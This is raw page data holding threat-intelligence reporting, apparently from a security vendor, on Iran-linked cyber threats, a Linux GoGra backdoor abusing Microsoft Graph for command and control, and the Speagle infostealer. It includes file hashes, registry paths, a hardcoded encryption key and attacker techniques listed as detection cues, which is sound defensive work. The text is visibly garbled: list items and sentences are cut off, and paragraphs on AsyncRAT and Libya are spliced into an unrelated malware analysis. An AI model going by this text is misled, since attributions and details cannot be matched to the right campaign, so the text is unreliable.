data-list-item-id=\"ee38a332901f0550436234911a4866b88\"\u003eCredential harvesting through phishing campaigns\u003c/li\u003e\u003c/ul\u003e\u003cp\u003eOrganizations should review and harden any identity security mechanisms by performing the following:\u003c/p\u003e\u003cul\u003e\u003cli data-list-item-id=\"e301b4b1a364cf4ac999c3b8bc3094b49\"\u003eEnable multi-factor authentication for all remote access\u003c/li\u003e\u003cli data-list-item-id=\"e620c417d33094b4eedd976309b4e74c5\"\u003eDisable legacy authentication protocols\u003c/li\u003e\u003cli data-list-item-id=\"eb4140b4818500b468a0321318fb72564\"\u003eImplement condition access policies based on location and device risk\u003c/li\u003e\u003cli data-list-item-id=\"eb0e10bd802f63a9907669761c2e1fadd\"\u003eRestrict admin logins to specific locations, where possible\u003c/li\u003e\u003cli data-list-item-id=\"ed04ca6098625b3b8a86c95978f25436a\"\u003eMonitor identity provider logs for any anomalies\u003c/li\u003e\u003c/ul\u003e\u003ch3\u003eLeak campaigns and intimidation operations\u003c/h3\u003e\u003cp\u003eHacktivist groups often use hack-and-leak campaigns designed to gain media attention and apply psychological pressure, usually via partial data leaks and exaggerated breach claims. Security teams should watch for indicators of data staging or exfiltration, such as the following:\u003c/p\u003e\u003cul\u003e\u003cli data-list-item-id=\"e3766d43b006a17cb769b7aab48df1fd3\"\u003eUnusual downloads from email systems\u003c/li\u003e\u003cli data-list-item-id=\"e3609cdd61bdf12fce06fb3e6cc5c16ff\"\u003eUnusual access to document repositories\u003c/li\u003e\u003cli data-list-item-id=\"ef7a5d98efc74600869e0324e3edf801d\"\u003eSuspicious archive creation (e.g. ZIP, RAR) on internal systems, usually involving collection of multiple file types\u0026nbsp;\u003c/li\u003e\u003cli data-list-item-id=\"e0e1b93d8bd0dd1ff29f11e3df3ffbac0\"\u003eLarge outbound data transfers to external cloud storage platforms\u0026nbsp;\u003c/li\u003e\u003cli data-list-item-id=\"ecd27e6779ad8457382341057c769c81a\"\u003eUnexpected use of data-transfer applications (e.g. Rclone) in their environment\u003c/li\u003e\u003c/ul\u003e\u003cp\u003eOrganizations should focus on ensuring monitoring is in place for the following:\u003c/p\u003e\u003cul\u003e\u003cli data-list-item-id=\"ee3551bc0a91088fa3fe63a7590b745f0\"\u003eLarge outbound data transfers\u003c/li\u003e\u003cli data-list-item-id=\"ec8642a82c5bdf9172c512ab434a02e36\"\u003eImplement data loss prevention (DLP) policies\u003c/li\u003e\u003cli data-list-item-id=\"e00dca864986c76de833162094b42a525\"\u003eRestrict access to external cloud storage platforms\u003c/li\u003e\u003cli data-list-item-id=\"ef999d269ec8e71f47b7c2bc4e432a6cb\"\u003eEnable auditing of email and file access\u003c/li\u003e\u003c/ul\u003e\u003cp\u003eHaving a communications plan for potential leak claims can also help organizations respond quickly to these threats.\u0026nbsp;\u003c/p\u003e\u003ch3\u003eAttacks on critical infrastructure\u003c/h3\u003e\u003cp\u003eCritical infrastructure organizations and companies that support military logistics may face attacks that attempt to compromise the following:\u003c/p\u003e\u003cul\u003e\u003cli data-list-item-id=\"e27261a57ab62b373b187aae3f8dc5d64\"\u003eOperational Technology (OT) interfaces\u0026nbsp;\u003c/li\u003e\u003cli networks\u003c/li\u003e\u003cli data-list-item-id=\"e0d42aeeac5d715a1088109418b40a8e3\"\u003eRemote management systems\u003c/li\u003e\u003c/ul\u003e\u003cp\u003eSecurity teams should ensure adequate monitoring is in place for:\u003c/p\u003e\u003cul\u003e\u003cli data-list-item-id=\"eedcc057d48eebaf843f7b545fd344e8d\"\u003eAbnormal access to ICS\u003c/li\u003e\u003cli should ensure:\u003c/p\u003e\u003cul\u003e\u003cli data-list-item-id=\"e7dc9e975de678bde2af4fb6ed093d701\"\u003eNetwork segmentation across operational technology networks\u003c/li\u003e\u003cli of critical configuration systems\u003c/li\u003e\u003c/ul\u003e\u003ch3\u003eDestructive attacks\u003c/h3\u003e\u003cp\u003eIran has repeatedly demonstrated its destructive capabilities in the past, with\u0026nbsp;\u003ca href=\"https://www.security.com/threat-intelligence/shamoon-back-destructive\"\u003eattacks such as Shamoon\u003c/a\u003e, which targeted Saudi Arabia's oil industry to wipe thousands of systems.\u0026nbsp;\u003c/p\u003e\u003cp\u003eOrganizations that anticipate such attacks should ensure they monitor for indicators that attackers may be preparing for a destructive operation such as:\u003c/p\u003e\u003cul\u003e\u003cli data-list-item-id=\"e4b4b06b075e6ec1d667443fd2ef05ce5\"\u003eMass scheduled task creation\u0026nbsp;\u003c/li\u003e\u003cli data-list-item-id=\"ea27e0611d11edcfb2bb916354ea134ab\"\u003eAttempts to disable security applications\u0026nbsp;\u003c/li\u003e\u003cli data-list-item-id=\"ead18a4d48690724886a628851fe3be1f\"\u003eDeletion of shadow copies or backup data\u003c/li\u003e\u003cli data-list-item-id=\"e848ab767fc6f0e5a439dc0d2f5d84590\"\u003eUnusual administrative commands executed across multiple hosts\u003c/li\u003e\u003c/ul\u003e\u003cp\u003eOrganizations should prioritize resilience against destructive attacks by conducting the following tasks:\u003c/p\u003e\u003cul\u003e\u003cli data-list-item-id=\"e1347f374bc0e4986c1ead6cb9929909f\"\u003eIsolating backup infrastructure from production networks\u003c/li\u003e\u003cli data-list-item-id=\"e3a03bd5e96152b8854cbc9d08d2e5a3e\"\u003eEnable immutable backups\u003c/li\u003e\u003cli data-list-item-id=\"efaeab571a48e6b510a071e1920c94f59\"\u003eTest disaster recovery procedures regularly\u003c/li\u003e\u003c/ul\u003e\u003cp\u003eEnsuring systems can be restored quickly is critical to recovering from the impact of destructive attacks.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eHistorical activity\u003c/h2\u003e\u003ch3\u003eStuxnet\u003c/h3\u003e\u003cp\u003eOne of the most infamous cyber incidents to ever take place in the Middle East region was the deployment of the Stuxnet worm, which was designed to break laboratory equipment used by Iranian scientists to enrich uranium at the Natanz facility in Iran. Iran has claimed that this facility\u0026nbsp;\u003ca href=\"https://www.reuters.com/world/middle-east/no-sign-irans-nuclear-sites-were-hit-iaea-says-iran-alleges-one-was-2026-03-02/\"\u003ehas been hit in strikes by Israel and the U.S. in recent days\u003c/a\u003e. The disruption of Iran’s nuclear program to prevent the country from developing nuclear weapons was one of the reasons given by the U.S. administration for carrying out these recent strikes. The facility was also hit in U.S. strikes in June 2025, which were believed at the time to have rendered the facility inoperable.\u0026nbsp;\u003c/p\u003e\u003cp\u003eStuxnet was among the first known major nation-state cyberattacks that demonstrated hackers’ ability to manipulate and even destroy physical equipment. Stuxnet was designed to cause the spinning motors at the bottom of Natanz's enrichment centrifuges to shatter. It was first\u0026nbsp;\u003ca href=\"https://docs.broadcom.com/doc/security-response-w32-stuxnet-dossier-11-en\"\u003epublished about by researchers at Symantec in 2010\u003c/a\u003e, after the worm spread outside of the Natanz facility and was found on private networks. Given that Stuxnet was only discovered after penetrating private networks, it is quite possible that cyber operations are currently being leveraged by and against infrastructure that we know nothing about - yet.\u003c/p\u003e\u003cp\u003eReports last year indicated potential cyber warfare impacting the region then too, including an attack by pro-Israel hackers dubbed Predatory Sparrow on Iranian crypto exchange Nobitex in which\u003ca href=\"https://www.bleepingcomputer.com/news/security/pro-israel-hackers-hit-irans-nobitex-exchange-burn-90m-in-crypto/\"\u003e the attackers drained $90 million of cryptocurrency\u003c/a\u003e from the exchange. There were also\u003ca href=\"https://thehackernews.com/2025/06/iranian-apt35-hackers-targeting-israeli.html\"\u003e reports\u003c/a\u003e that Iranian group Damselfly was carrying out a targeted phishing campaign focused on high-profile Israeli individuals, particularly prominent academics, journalists, and security researchers (\u003cem\u003eSee more in Damselfly profile\u003c/em\u003e).\u003c/p\u003e\u003cp\u003eDamselfly is just one of the key cyber actors who may be active in the current conflict, potentially targeting the networks of significant institutions in other nations for espionage, disruptive or destructive purposes.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eOther key actors\u003c/h2\u003e\u003ch3\u003eDruidfly\u003c/h3\u003e\u003cp\u003eDruidfly (aka Homeland Justice, Karma) is an Iranian attack group that specializes in disk-wiping attacks. It first came to public attention after a July 2022 wiper attack on multiple targets belonging to the government of Albania. The wiper left messages directed against the Mujahideen E-Khalq (MEK), an Iranian dissident organization based in Albania. Shortly afterward, a group calling itself Homeland Justice claimed credit for the attack.\u003c/p\u003e\u003cp\u003e\u0026nbsp;In response to the attack, Albania broke off diplomatic relations with Iran. This triggered another wave of attacks in September 2022, apparently in retaliation for Albania publicly attributing the attacks to Iran. While Homeland Justice purported to be a hacktivist outfit, the FBI later established that “Iranian state cyber actors” were responsible for the attacks.\u0026nbsp;\u003c/p\u003e\u003cp\u003eDruidfly reappeared in 2023, when it began targeting Israel with a wiper called BibiWiper, seemingly named after Israeli Prime Minister Benjamin Netanyahu, whose nickname is “Bibi” \u003cem\u003e(See Case Study)\u003c/em\u003e.\u003c/p\u003e\u003cp\u003e\u003ca href=\"https://x.com/threatintel/status/1936049254432231444\"\u003eOn June 20, 2025, when hostilities between Iran and Israel were previously at a high, we tweeted that we had seen a Druidfly wiper targeting organizations in Albania\u003c/a\u003e. The wiper was signed with a legitimate certificate, which was probably stolen. On the Monday following (June 23),\u003ca href=\"https://therecord.media/tirana-albania-government-cyberattack-iran-linked-group\"\u003e it was reported in the media that public services in Albania’s capital Tirana had been disrupted by a cyber attack\u003c/a\u003e that took down the city’s official website and affected local government operations. Homeland Justice claimed credit for the attack and said it had taken down the city’s official website, exfiltrated data and wiped servers, citing the presence of MEK in the country as the reason for the attack.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eCase study: Druidfly attacks on Israeli targets\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eFollowing the escalation of the conflict in Gaza in 2023, Druidfly was linked to a series of wiper attacks against multiple targets in Israel. In this case, the attacks were carried out under a persona called Karma that purports to be a hacktivist group sympathetic to the Palestinian cause.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe wiper deployed in these attacks was called BibiWiper, seemingly named after Israeli Prime Minister Benjamin Netanyahu, whose nickname is Bibi. The wiper encrypted files on the hard disk before overwriting the master boot record (MBR) and crashing the computer. Efforts to restart the computer would fail because of the destruction of the MBR. Analysis of the wiper revealed clear anti-Israel messages within the wiper’s code.\u003c/p\u003e"])</script><script>self.__next_f.push([1,"16:T1f04,"])</script><script>self.__next_f.push([1,"\u003cp\u003eFurthermore, analysis of BibiWiper by the Threat Hunter Team found clear similarities between it and wipers deployed by Druidfly during attacks against Albania in 2022 and 2023.\u003c/p\u003e\u003cp\u003eTracing other tools used to initiate the BibiWiper attacks against Israel revealed the following overlap in tactics, techniques, and procedures between these attacks and earlier Druidfly attacks:\u003c/p\u003e\u003cul\u003e\u003cli data-list-item-id=\"eaeeb00d1b3fee85f1764530d8616b71b\"\u003eHTTPSnoop malware was previously deployed prior to the Druidfly wiping attacks\u003c/li\u003e\u003cli data-list-item-id=\"e8813c16ba2ffe79b17c2f805d344a979\"\u003eUse of the remote desktop tools AnyDesk and ScreenConnect\u003c/li\u003e\u003cli data-list-item-id=\"e27e5de1cfb083dac4c58a312a596b7d7\"\u003eUse of ReGeorg web shells\u003c/li\u003e\u003c/ul\u003e\u003ch3\u003eDamselfly\u003c/h3\u003e\u003cp\u003eDamselfly (aka Charming Kitten, Mint Sandstorm) is an Iranian espionage group that has been active since 2014. It was initially known for targeting Israel with attacks before it broadened its focus to include the U.S. and other countries. While the group is principally known to be involved in intelligence gathering, members of the group are also known to have participated in extortion attacks. It has been linked by multiple vendors with Iran’s Islamic Revolutionary Guard Corps (IRGC).\u003c/p\u003e\u003cp\u003eIn March 2022, Damselfly was\u0026nbsp;\u003ca href=\"https://go.recordedfuture.com/hubfs/reports/cta-2022-0330.pdf\"\u003eone of several Iranian groups reported to have moved into mounting large-scale social engineering campaigns\u003c/a\u003e. Consistent features of these campaigns included the use of charismatic sock puppets, lures of prospective job opportunities, solicitation by journalists, and masquerading as think tank experts seeking opinions. The attackers leveraged networks such as LinkedIn, Facebook, Twitter, and Google.\u003c/p\u003e\u003cp\u003eDamselfly has also been linked to an attack targeting a nuclear security expert at a U.S.-based think tank in July 2023; attacks on Israel’s transportation, logistics, and technology sectors in November 2023; as well as a January 2024 campaign targeting individuals working on Middle Eastern affairs at universities and research organizations in Belgium, France, Gaza, Israel, the UK, and the U.S. The attackers in that campaign used bespoke phishing lures themed around the Israel-Hamas conflict to trick targets into downloading malware.\u003c/p\u003e\u003cp\u003eIn 2025,\u0026nbsp;\u003ca href=\"https://research.checkpoint.com/2025/iranian-educated-manticore-targets-leading-tech-academics/\"\u003eCheck Point reported\u003c/a\u003e that a new Damselfly campaign that began in mid-June 2025 targeted Israeli journalists, cyber security experts and computer science professors from leading Israeli universities with spear phishing campaigns in an attempt to steal credentials and multi-factor authentication codes in order to gain access to targets’ email accounts. Some of the victims were approached by attackers who posed as fictitious assistants to technology executives or researchers through emails and WhatsApp messages.\u003c/p\u003e\u003ch3\u003eMantis\u003c/h3\u003e\u003cp\u003eActive since at least 2014, Mantis (aka Desert Falcon, Arid Viper, APT-C-23), is an Arabic speaking group that appears to be based in the Gaza Strip. The group is known to mount espionage attacks against targets in the government, military, media, financial, research, education, and energy sectors. Most of its attacks have been against organizations in the Middle East but it has, on occasion, attacked targets outside the region. It has also been known on occasion to target individuals or organizations internally within Gaza. While\u003ca href=\"https://www.cybereason.com/blog/operation-bearded-barbie-apt-c-23-campaign-targeting-israeli-officials\"\u003e other vendors have linked the group to Hamas\u003c/a\u003e, the Threat Hunter Team cannot make a definitive attribution to any Palestinian organization.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe group mainly favors spear-phishing emails with malicious attachments or links to malicious files as its main infection vector. Mantis uses custom malware and its most recent toolset includes the backdoors Trojan.Micropsia and Trojan.AridGopher. Micropsia is capable of taking screenshots, keylogging, and archiving certain file types using WinRAR in preparation for data exfiltration. However, its main purpose appears to be running secondary payloads for the attackers. Arid Gopher is a modular backdoor that is written in Go. It appears to be regularly updated and rewritten by the attackers, most likely to evade detection.\u003c/p\u003e\u003cp\u003eThese tools were used in a Mantis attack in late 2022/early 2023 that targeted organizations within the Palestinian territories. The initial infection vector for this campaign remains unknown, but both the Micropsia and AridGopher malware were deployed in this attack. In one intrusion, the attackers deployed three distinct versions of the same toolset (that is, different variants of the same tools) on three groups of computers. Compartmentalizing the attack in this fashion was likely a precautionary measure. If one toolset was discovered, the attackers would still have a persistent presence on the target’s network.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eIndicators of Compromise (IOCs)\u003c/h2\u003e\u003cp\u003e0f9cf1cf8d641562053ce533aaa413754db88e60404cab6bbaa11f2b2491d542 - The malware uses the legitimate Microsoft Graph API and Outlook mailboxes as a covert command-and-control (C2) channel, allowing it to bypass traditional perimeter network defenses.\u003c/p\u003e\u003cp\u003eThe Symantec and Carbon Black Threat Hunter Team linked this new Linux malware to a previously known Windows espionage campaign by Harvester due to similarities in code, demonstrating that the threat actor is actively expanding its cross-platform capabilities.\u003c/p\u003e\u003cp\u003eWhile we did not observe victims in this campaign, initial VirusTotal submissions originated from India and Afghanistan, which indicates that these regions were the primary targets of this espionage activity. Also, the use of localized decoy documents highlights a tailored approach that may be aimed at a specific regional demographic. Historically, Harvester has targeted victims in South Asia.\u003c/p\u003e\u003cp\u003eHarvester is believed to be a nation-state-backed group that \u003ca href=\"https://www.security.com/threat-intelligence/harvester-new-apt-attacks-asia\"\u003ehas been active since at least 2021\u003c/a\u003e. It is known to use both custom malware and publicly available tools in its attacks. One of its tools is a custom backdoor called Graphon, which has similarities with GoGra and also uses Microsoft infrastructure for its C2 activity.\u003c/p\u003e\u003ch2\u003eAttack chain\u003c/h2\u003e\u003cp\u003eThe attackers use social engineering lures to gain initial access to victim networks by deploying tailored decoy documents. The attackers actively masquerade malicious ELF files as standard document files by appending extensions like “. pdf”, with a subtle space between the filename and the extension to ensure that the file still executes as a Linux binary.\u0026nbsp;Depending on the specific campaign, the dropper displays either a PDF or an OpenDocument Text (ODT) file disguised as a PDF. One decoy document masqueraded as material from \"Zomato Pizza\". Zomato is a popular Indian food delivery service. Another was named umrah.pdf, referencing the Islamic pilgrimage to Mecca. \u0026nbsp;Other examples of deceptive filenames used in lure documents included “TheExternalAffairesMinister. pdf” and “Details Format. pdf”.\u003c/p\u003e\u003cp\u003eA Go dropper is then used to embed and deploy a roughly 5.9 MB i386 executable. The malware writes its internal payload to \u003cem\u003e~/.config/systemd/user/userservice\u003c/em\u003e and ensures execution upon system reboot by setting up a systemd user unit and an XDG autostart entry. This autostart entry actively masquerades as the legitimate \"Conky\" Linux system monitor.\u003c/p\u003e\u003ch2\u003eAbuse of Microsoft Graph API for C2\u003c/h2\u003e\u003cp\u003eOne of the most notable features of this new backdoor is \u003ca href=\"https://www.security.com/threat-intelligence/graph-api-threats\"\u003eits abuse of legitimate Microsoft cloud infrastructure\u003c/a\u003e. The inner i386 implant comes equipped with hardcoded, plaintext Azure AD application credentials, including a tenant ID, client ID, and client secret. These credentials allow the malware to request OAuth2 tokens from Microsoft.\u003c/p\u003e\u003cp\u003eIt uses OData queries to poll a specific mailbox folder, named “Zomato Pizza”, at two-second intervals. OData (Open Data Protocol) query is the syntax used to filter, sort, and shape data when interacting with the Microsoft Graph API. Interestingly, the Windows version of the malware used a mailbox named “Dragan Dash”.\u0026nbsp;\u003ca href=\"https://www.google.com/search?sca_esv=55e9f3c856495c1e\u0026amp;rlz=1C5GCEM_enIE1099IE1100\u0026amp;sxsrf=ANbL-n4cBNYA-tghggGNlPVbVmpC_KHhwg%3A1776264450357\u0026amp;q=Dragan+Dash+Kitchen\u0026amp;nfpr=1\u0026amp;sa=X\u0026amp;ved=2ahUKEwif9fvejPCTAxWNa0EAHfSxB8QQgK4QegQIARAB\u0026amp;biw=1806\u0026amp;bih=842\u0026amp;dpr=2\u0026amp;mstk=AUtExfDWHAsbdO9hx4GIdCj7c0_YWULqYNqbdUf_662pqo2-QGYGu1cl1tyfnEE2oOpcraRu01IfwFnoAxqCBC-idIGDuzs1fZAEmIae1POT5QjPp_hHQ4sqQqjGQOPIeDFHrl7RENbNquWLZROr5sERB801ox0V9mxvmLmLKR-BBpICeEMlG7VkKRkTWmzggPeYACa-fWouoFiXgbQJaloQLfW9rzq4V7h6YUHhDTMfWehs_DMQbdVVd7GoEKpMvUln9L7J3xDB0g99ksGGCa5772RN\u0026amp;csui=3\"\u003eDragan Dash Kitchen\u003c/a\u003e\u0026nbsp;is\u0026nbsp;a food delivery restaurant located in in the Indian city of Hyderabad.\u003c/p\u003e\u003cp\u003eThe backdoor filters for incoming email messages with a subject line starting with the word ‘Input’. Upon receiving an email, it decrypts the base64-wrapped message body using AES-CBC encryption, and executes the payload on the host via \u003cem\u003e/bin/bash -c\u003c/em\u003e.\u003c/p\u003e\u003cp\u003eExecution results are AES-encrypted and emailed back to the operator via a reply message using the subject line ‘Output’. Following exfiltration, the implant issues an HTTP DELETE command to wipe the original tasking message and remove evidence of its presence.\u003c/p\u003e\u003ch2\u003eCross-platform capabilities: Linux vs Windows variants\u003c/h2\u003e\u003cp\u003eAnalysis by our team has confirmed that this new Linux threat and a previously analyzed Windows variant of GoGra share a nearly identical underlying codebase, pointing towards a multi-platform development strategy by the Harvester threat actors.\u003c/p\u003e\u003cp\u003eDespite using different deployment architectures and operating systems, the underlying C2 logic remains unchanged. AsyncRAT is a remote access Trojan with a variety of capabilities, including keylogging, screen capture, and remote command execution capabilities, making it ideal for use in intelligence gathering and espionage attacks. It is also modular, meaning it can be updated and customized, which is attractive for attackers. AsyncRAT is publicly available so is not associated with one specific threat actor, and it has been used by both state-sponsored actors and ransomware actors in the past. This means we have not been able to attribute this activity to a named actor.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe earliest activity in this campaign occurred in November 2025, with the most recent activity occurring in mid-February 2026. Libya has been in a state of fluctuating stability since the Arab Spring of 2011 that toppled its long-time ruler Muammar Gaddafi. Attackers' willingness to take advantage of potential instability has relevance to the ongoing geopolitical situation in the world with the strikes and counterstrikes in the Gulf region leading to fears about what the ongoing situation may mean for the region and the wider global economy.\u003c/p\u003e\u003cp\u003e\u003ca href=\"https://www.bbc.com/news/articles/cr5l988qr47o\"\u003eClashes in the Strait of Hormuz\u003c/a\u003e, through which around 20% of the world’s oil travels, have led to claims that \u003ca href=\"https://www.reuters.com/business/energy/iran-says-oil-will-reach-200-barrel-warns-continuous-strikes-2026-03-11/\"\u003eoil costs could rise to more than $200 a barrel\u003c/a\u003e. This instability is likely to mean that interest in oil-producing nations and organizations outside of Iran is likely to peak - among both the general population and cyber actors too, who will always take advantage of emerging topical conflicts to capitalize on instability, or to use interest in them as part of lure documents and phishing emails.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThose operating in the energy sector should be aware that they could be the targets of unscrupulous threat actors in these tumultuous times. AsyncRAT\u003c/p\u003e\u003cp\u003ef8b5a5429fb1da677ab8c09fc95b26e3b3d8bcd27521a56cc835fbf5878dbcd8 - AsyncRAT\u003c/p\u003e"])</script><script>self.__next_f.push([1,"1a:T3790,"])</script><script>self.__next_f.push([1,"\u003cp\u003eSymantec and Carbon Black researchers have uncovered a mysterious and stealthy new threat that hijacks the functionality and infrastructure\u0026nbsp;of the legitimate security software Cobra DocGuard. Infostealer.Speagle is designed to surreptitiously harvest sensitive information from infected computers and transmit it to a Cobra DocGuard server that has been compromised by the attackers, masking the data exfiltration process as legitimate communications between client and server. Notably, Speagle appears to be capable of collecting information on highly targeted subjects, such as specifically seeking out documents related to Chinese ballistic missiles.\u003c/p\u003e\u003cp\u003eCobra DocGuard is a legitimate document security and encryption platform that is developed by Chinese company EsafeNet. The software has been repeatedly targeted by attackers. In May 2023,\u0026nbsp;\u003ca href=\"https://www.eset.com/us/business/cyber-risk-insurance/apt-activity-report-t3-2022/\"\u003eESET reported\u003c/a\u003e that it had been compromised to carry out a software supply chain attack on a gambling company in Hong Kong in September 2022. In August 2023, our Threat Hunter Team\u0026nbsp;\u003ca href=\"https://www.security.com/threat-intelligence/carderbee-software-supply-chain-certificate-abuse\"\u003ediscovered an APT group named Carderbee using Cobra DocGuard\u003c/a\u003e to perform a supply chain attack to deliver the Korplug backdoor (aka PlugX) to multiple organizations in Hong Kong and a number of Asian countries.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eAttribution\u003c/h2\u003e\u003cp\u003eSo far, we have been unable to associate Speagle with any known threat actor. We have assigned the name Runningcrab to the actor behind it. Interestingly, Speagle is designed to collect and exfiltrate data only when running on computers with Cobra DocGuard data protection software installed. This indicates deliberate targeting, possibly to facilitate intelligence collection or industrial espionage. At present, we believe the most likely hypotheses are that it is either the work of a state-sponsored actor or the work of a private contractor available for hire.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eSupply chain attack?\u003c/h2\u003e\u003cp\u003eThe infection vector used by Speagle remains unknown. However, there are some low-confidence indications that it may have been distributed via a supply chain attack. Aside from the fact that Cobra DocGuard has fallen victim to supply chain attacks at least twice before, Runningcrab, in this case, hijacked a legitimate Cobra DocGuard server and used it for command and control (C\u0026amp;C) of Speagle, exfiltrating stolen data from infected computers to this server.\u003c/p\u003e\u003cp\u003eSecondly, the malware’s self-delete functionality (detailed below) calls upon a legitimate Cobra DocGuard driver and attempts to leverage it to delete the executable. Security software such as Cobra DocGuard often contains anti-tamper features designed to prevent attackers from killing it by terminating and deleting processes. The fact that the malware used a Cobra DocGuard driver to self-delete suggests it could have been delivered as part of a Trojanized software update, however, this is only a hypothesis at present.\u003c/p\u003e\u003ch2\u003eSpeagle analysis\u003c/h2\u003e\u003cp\u003eSpeagle is a 32-bit .NET executable. When run, it determines the installation folder of Cobra DocGuard by first checking for the registry value:\u003c/p\u003e\u003cp class=\"Code\"\u003e\u003cem\u003eHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Esafenet\\CDG System\\\"InstallDir\"\u003c/em\u003e\u003c/p\u003e\u003cp\u003eIf this fails, it will check for the registry value:\u0026nbsp;\u003c/p\u003e\u003cp class=\"Code\"\u003e\u003cem\u003eHKEY_LOCAL_MACHINE\\SOFTWARE\\Esafenet\\CDG System\\\"InstallDir\"\u003c/em\u003e\u003c/p\u003e\u003cp\u003eIf both fail, it will use a hardcoded string:\u003c/p\u003e\u003cp class=\"Code\"\u003e\u003cem\u003e\"C:\\Program Files\\EsafeNet\\Cobra DocGuard Client\\\"\u003c/em\u003e\u003c/p\u003e\u003cp\u003eSpeagle\u0026nbsp;will then collect and exfiltrate information from the infected machine. Collection and exfiltration are performed in phases, with attempts to exfiltrate the data collected during each phase before proceeding to the next phase. This may allow the attackers to exfiltrate at least partial data in case Speagle is stopped during a later phase.\u003c/p\u003e\u003ch3\u003eFirst phase\u003c/h3\u003e\u003cp\u003eSpeagle uses a custom structure that is referred to as \u003cem\u003e\"ErrorReport\"\u003c/em\u003e by its developer to store information collected from the infected machine. First, it obtains the following details and stores them as members of the \u003cem\u003eErrorReport\u003c/em\u003e structure:\u003c/p\u003e\u003cul\u003e\u003cli data-list-item-id=\"e0d6fd64f47446c214e20e6713ddd05c1\"\u003e\u003cem\u003emember hostName: \u003c/em\u003ename of the affected Windows computer,\u003c/li\u003e\u003cli following file, using a hardcoded pathname:\u003c/p\u003e\u003cp class=\"Code\"\u003e\u003cem\u003e\"C:\\ProgramData\\EstConfig.ini\"\u003c/em\u003e\u003c/p\u003e\u003cp\u003eIf the content of the phases and directly proceeds to self-delete.\u003c/p\u003e\u003ch3\u003eExfiltration\u0026nbsp;\u003c/h3\u003e\u003cp\u003eIn order to exfiltrate the stolen data, Speagle serializes the \u003cem\u003eErrorReport\u003c/em\u003e structure as an XML string before compressing it with the Deflate algorithm. It then encrypts the compressed data with the AES-128 algorithm in CBC encryption mode with PKCS#7 padding, where the first 16 bytes of the SHA256 digest of the hardcoded string \"kAozqXwNES5yjGcZUlXeI4zigg68aZI4\" are used as the encryption key. The encrypted data, consisting of the AES-128 initialization vector followed by the padded ciphertext, is then hexlified and transmitted using the HTTP protocol.\u003c/p\u003e\u003cp\u003eSpeagle uses a hardcoded URL, which appears to connect to a legitimate Cobra DocGuard server hosted by the attacked organization.
